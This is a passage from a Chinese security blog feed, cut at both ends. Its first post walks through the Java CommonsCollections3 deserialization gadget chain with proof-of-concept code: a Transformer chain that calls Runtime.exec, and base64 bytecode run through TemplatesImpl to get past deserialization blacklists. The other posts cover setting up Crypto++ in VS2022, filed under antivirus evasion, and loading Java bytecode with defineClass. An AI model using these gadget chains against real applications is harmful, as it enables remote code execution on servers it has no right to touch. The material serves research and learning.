    <content type="html"><![CDATA[<h1 id="Java利用链CommonCollections3"><a href="#Java利用链CommonCollections3" class="headerlink" title="Java利用链CommonCollections3"></a>Java利用链CommonCollections3</h1><p>CommonCollections3利用了TemplatesImpl这条链</p><h2 id="CC3简易触发"><a href="#CC3简易触发" class="headerlink" title="CC3简易触发"></a>CC3简易触发</h2><p>结合CC1的Transformer触发方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用TemplatesImpl的newTransformer即可触发，修改POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = org.apache.commons.codec.binary.Base64.decodeBase64(<span class="string">&quot;yv66vgAAADIAMwoABwAiCQAjACQIACUKACYAJwoAJgAoBwApBwAqAQAJdHJhbnNmb3JtAQBQKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHEx0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWDsBAANkb20BABxMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007AQAVc2VyaWFsaXphdGlvbkhhbmRsZXJzAQAxW0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACsBAHMoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO0xvcmcvYXBhY2hlL3htbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAPZHRtQXhpc0l0ZXJhdG9yAQAkTG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAUc2VyaWFsaXphdGlvbkhhbmRsZXIBADBMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE1RlbXBsYXRlc0ltcGxYLmphdmEMABoAGwcALAwALQAuAQATdGVtcGxhdGVYIGNvbnN0cnVjdAcALwwAMAAxDAAwADIBABp0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWAEAL29yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABChJKVYAIQAGAAcAAAAAAAQAAQAIAAkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAAA0ADAAAACAAAwAAAAEADQAOAAAAAAABAA8AEAABAAAAAQARABIAAgATAAAABAABABQAAQAIABUAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABIADAAAACoABAAAAAEADQAOAAAAAAABAA8AEAABAAAAAQAWABcAAgAAAAEAGAAZAAMAEwAAAAQAAQAUAAEAGgAbAAEACgAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAsAAAAOAAMAAAAUAAQAFQAMABYADAAAAAwAAQAAAA0ADQAOAAAACQAcAB0AAQAKAAAAOAACAAEAAAAKsgACEQKatgAFsQAAAAIACwAAAAoAAgAAABkACQAaAAwAAAAMAAEAAAAKAB4AHwAAAAEAIAAAAAIAIQ==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tpi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">org</span>.apache.xalan.xsltc.trax.TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(tpi),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功触发</p><p><img src="/image/article/%E5%85%B3%E4%BA%8ETemplatesImpl%E7%9A%84Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections3.assets/image-20240125201700067.png" alt="image-20240125201700067"></p><h2 id="ysoserial中的CC3利用链"><a href="#ysoserial中的CC3利用链" class="headerlink" title="ysoserial中的CC3利用链"></a>ysoserial中的CC3利用链</h2><p>查看ysoserial中的CC3代码</p><p><img src="/image/article/%E5%85%B3%E4%BA%8ETemplatesImpl%E7%9A%84Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections3.assets/image-20240125201842918.png" alt="image-20240125201842918"></p><p>大体看上去和CC1的动态代理LazyMap触发的方式一样</p><p>CC3出现背景是有用SerialKill等对反序列化过滤的安全工具将一些类加入了黑名单，其中包括InvokerTransformer，为了绕过InvokerTransformer的限制出现了CC3。</p><p>绕过的方式为通过一个新的Transformer:</p><p> <code>org.apache.commons.collections.functors.InstantiateTransformer</code></p><p>它的transform是调用构造方法</p><p><img src="/image/article/%E5%85%B3%E4%BA%8ETemplatesImpl%E7%9A%84Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections3.assets/image-20240125202815838.png" alt="image-20240125202815838"></p><p>而在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>类的构造方法恰巧调用了TemplatesImpl的newTransformer方法</p><p><img src="/image/article/%E5%85%B3%E4%BA%8ETemplatesImpl%E7%9A%84Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections3.assets/image-20240125203004748.png" alt="image-20240125203004748"></p><p>整个利用链串联一起实现反序列化</p>]]></content>
    
    
    <summary type="html">关于TemplatesImpl的Java利用链CommonCollections3</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>VS2022中使用Cryptopp加密库</title>
    <link href="http://example.com/posts/397717936.html"/>
    <id>http://example.com/posts/397717936.html</id>
    <published>2024-01-24T03:54:58.000Z</published>
    <updated>2024-03-03T14:44:20.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VS2022中使用Cryptopp加密库"><a href="#VS2022中使用Cryptopp加密库" class="headerlink" title="VS2022中使用Cryptopp加密库"></a>VS2022中使用Cryptopp加密库</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>cryptopp：</p><p><a href="https://www.cryptopp.com/#download">https://www.cryptopp.com/#download</a></p><p><a href="https://github.com/weidai11/cryptopp">https://github.com/weidai11/cryptopp</a></p><p>cryptopp-pem：</p><p><a href="https://github.com/noloader/cryptopp-pem">https://github.com/noloader/cryptopp-pem</a></p><h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2><p><a href="https://cryptopp.com/wiki/Main_Page">https://cryptopp.com/wiki/Main_Page</a></p><h2 id="下载cryptopp和cryptopp-pem"><a href="#下载cryptopp和cryptopp-pem" class="headerlink" title="下载cryptopp和cryptopp-pem"></a>下载cryptopp和cryptopp-pem</h2><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124120927967.png" alt="image-20240124120927967"></p><p>将pem项目中的全部内容复制到cryptopp中</p><h2 id="Cryptopp项目库生成"><a href="#Cryptopp项目库生成" class="headerlink" title="Cryptopp项目库生成"></a>Cryptopp项目库生成</h2><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124121950277.png" alt="image-20240124121950277"></p><p>打开后有四个子工程</p><blockquote><p>cryptdll - 生成cryptopp.dll动态库</p><p>dlltest - 用来测试cryptopp.dll，依赖cryptdll工程</p><p>cryptlib - 生成cryptlib.lib静态库</p><p>cryptest - 用来测试cryptopp，依赖cryptlib工程</p></blockquote><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124122042469.png" alt="image-20240124122042469"></p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124122244838.png" alt="image-20240124122244838"></p><p>在crtptlib中Header Files &#x3D;&gt; 添加 &#x3D;&gt; 现有项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pem.h</span><br><span class="line">pem_common.h</span><br></pre></td></tr></table></figure><p>Source Files &#x3D;&gt; 添加 &#x3D;&gt; 现有项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pem_common.cpp</span><br><span class="line">pem_read.cpp</span><br><span class="line">pem_write.cpp</span><br></pre></td></tr></table></figure><p>重新在DEBUG和RELEASE生成</p><p>最终会在项目目录生成x64&#x2F;Output文件夹</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124122916335.png" alt="image-20240124122916335"></p><p>文件夹内容为lib库</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124122929849.png" alt="image-20240124122929849"></p><p>新建文件夹crypropp和子文件夹include和lib</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124123122265.png" alt="image-20240124123122265"></p><p>将cryptopp中所有.h的头文件copy到include</p><p>将Output文件夹放入lib</p><h2 id="VS2022使用cryptopp库"><a href="#VS2022使用cryptopp库" class="headerlink" title="VS2022使用cryptopp库"></a>VS2022使用cryptopp库</h2><p>新建控制台项目</p><p>替换项目为官方AES代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cryptlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;rijndael.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;modes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;files.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;osrng.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hex.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> CryptoPP;</span><br><span class="line"></span><br><span class="line">    AutoSeededRandomPool prng;</span><br><span class="line">    <span class="function">HexEncoder <span class="title">encoder</span><span class="params">(<span class="keyword">new</span> FileSink(std::cout))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">SecByteBlock <span class="title">key</span><span class="params">(AES::DEFAULT_KEYLENGTH)</span></span>;</span><br><span class="line">    <span class="function">SecByteBlock <span class="title">iv</span><span class="params">(AES::BLOCKSIZE)</span></span>;</span><br><span class="line"></span><br><span class="line">    prng.<span class="built_in">GenerateBlock</span>(key, key.<span class="built_in">size</span>());</span><br><span class="line">    prng.<span class="built_in">GenerateBlock</span>(iv, iv.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    std::string plain = <span class="string">&quot;CBC Mode Test:Hello!&quot;</span>;</span><br><span class="line">    std::string cipher, recovered;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;plain text: &quot;</span> &lt;&lt; plain &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************\</span></span><br><span class="line"><span class="comment">    \*********************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        CBC_Mode&lt; AES &gt;::Encryption e;</span><br><span class="line">        e.<span class="built_in">SetKeyWithIV</span>(key, key.<span class="built_in">size</span>(), iv);</span><br><span class="line"></span><br><span class="line">        <span class="function">StringSource <span class="title">s</span><span class="params">(plain, <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">new</span> StreamTransformationFilter(e,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">new</span> StringSink(cipher)</span></span></span><br><span class="line"><span class="params"><span class="function">            ) <span class="comment">// StreamTransformationFilter</span></span></span></span><br><span class="line"><span class="params"><span class="function">        )</span></span>; <span class="comment">// StringSource</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************\</span></span><br><span class="line"><span class="comment">    \*********************************/</span></span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;key: &quot;</span>;</span><br><span class="line">    encoder.<span class="built_in">Put</span>(key, key.<span class="built_in">size</span>());</span><br><span class="line">    encoder.<span class="built_in">MessageEnd</span>();</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;iv: &quot;</span>;</span><br><span class="line">    encoder.<span class="built_in">Put</span>(iv, iv.<span class="built_in">size</span>());</span><br><span class="line">    encoder.<span class="built_in">MessageEnd</span>();</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;cipher text: &quot;</span>;</span><br><span class="line">    encoder.<span class="built_in">Put</span>((<span class="type">const</span> byte*)&amp;cipher[<span class="number">0</span>], cipher.<span class="built_in">size</span>());</span><br><span class="line">    encoder.<span class="built_in">MessageEnd</span>();</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************\</span></span><br><span class="line"><span class="comment">    \*********************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        CBC_Mode&lt; AES &gt;::Decryption d;</span><br><span class="line">        d.<span class="built_in">SetKeyWithIV</span>(key, key.<span class="built_in">size</span>(), iv);</span><br><span class="line"></span><br><span class="line">        <span class="function">StringSource <span class="title">s</span><span class="params">(cipher, <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">new</span> StreamTransformationFilter(d,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">new</span> StringSink(recovered)</span></span></span><br><span class="line"><span class="params"><span class="function">            ) <span class="comment">// StreamTransformationFilter</span></span></span></span><br><span class="line"><span class="params"><span class="function">        )</span></span>; <span class="comment">// StringSource</span></span><br><span class="line"></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;recovered text: &quot;</span> &lt;&lt; recovered &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="设置属性"><a href="#设置属性" class="headerlink" title="设置属性"></a>设置属性</h3><p>C&#x2F;C++ &#x3D;&gt; 常规 &#x3D;&gt; 附加包含目录</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124123956329.png" alt="image-20240124123956329"></p><p>C&#x2F;C++ &#x3D;&gt; 代码生成 &#x3D;&gt; 运行库</p><p>Release选择MT </p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124124046673.png" alt="image-20240124124046673"></p><p>链接器 &#x3D;&gt; 常规 &#x3D;&gt; 附加库目录</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124124235343.png" alt="image-20240124124235343"></p><p>链接器 &#x3D;&gt; 输入 &#x3D;&gt; 附加依赖项</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124124355297.png" alt="image-20240124124355297"></p><h2 id="使用测试"><a href="#使用测试" class="headerlink" title="使用测试"></a>使用测试</h2><p>在设置好的Release版本成功运行</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124124531689.png" alt="image-20240124124531689"></p>]]></content>
    
    
    <summary type="html">VS2022中使用Cryptopp加密库</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="工具使用" scheme="http://example.com/tag/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java动态加载字节码TemplatesImpl和BCEL</title>
    <link href="http://example.com/posts/1379073624.html"/>
    <id>http://example.com/posts/1379073624.html</id>
    <published>2024-01-21T13:59:59.000Z</published>
    <updated>2024-03-03T14:59:26.396Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java动态加载字节码TemplatesImpl和BCEL"><a href="#Java动态加载字节码TemplatesImpl和BCEL" class="headerlink" title="Java动态加载字节码TemplatesImpl和BCEL"></a>Java动态加载字节码TemplatesImpl和BCEL</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java字节码存储在.class文件在JVM虚拟机运行</p><h2 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h2><p>Java文件经历ClassLoader#loadClass&#x3D;&gt;ClassLoader#findClass&#x3D;&gt;ClassLoader#defineClass</p><p>defineClass这一步用来处理前面传入的字节码，并处理成Java类</p><p>可用来直接加载字节码</p><h3 id="defineClass加载字节码"><a href="#defineClass加载字节码" class="headerlink" title="defineClass加载字节码"></a>defineClass加载字节码</h3><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240121224237477.png" alt="image-20240121224237477"></p><p>先准备一个.class文件</p><p>写一个DefineClass.java文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefineClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;New instance construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译.java文件 生成DefineClass.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac DefineClass.java</span><br></pre></td></tr></table></figure><p>将DefineClass.class文件进行base64加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQAHgoABwAPCQAQABEIABIKABMAFAgAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAR0ZXN0AQAKU291cmNlRmlsZQEAEERlZmluZUNsYXNzLmphdmEMAAgACQcAGAwAGQAaAQAWTmV3IGluc3RhbmNlIGNvbnN0cnVjdAcAGwwAHAAdAQAHdGVzdDEyMwEAC0RlZmluZUNsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAYABwAAAAAAAgABAAgACQABAAoAAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQALAAAADgADAAAAAwAEAAQADAAFAAEADAAJAAEACgAAACUAAgABAAAACbIAAhIFtgAEsQAAAAEACwAAAAoAAgAAAAgACAAJAAEADQAAAAIADg==</span><br></pre></td></tr></table></figure><p>直接使用defineClass加载字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDefineClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, 